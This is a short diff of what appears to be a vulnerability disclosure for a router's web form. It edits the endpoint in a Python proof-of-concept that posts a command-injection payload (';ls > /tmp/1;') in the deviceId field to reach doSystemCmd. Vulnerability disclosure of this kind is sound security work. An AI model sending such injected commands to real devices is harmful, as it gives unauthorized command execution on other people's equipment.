@@ -24,7 +24,7 @@ get value from deviceId ,then call doSystemCmd, can execute arbitrary command.
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetSambaConf"
+url = "http://192.168.1.13/goform/SetSambaConf"
 payload = ';ls > /tmp/1;'
 
 r = requests.post(url, data={'deviceId': payload})
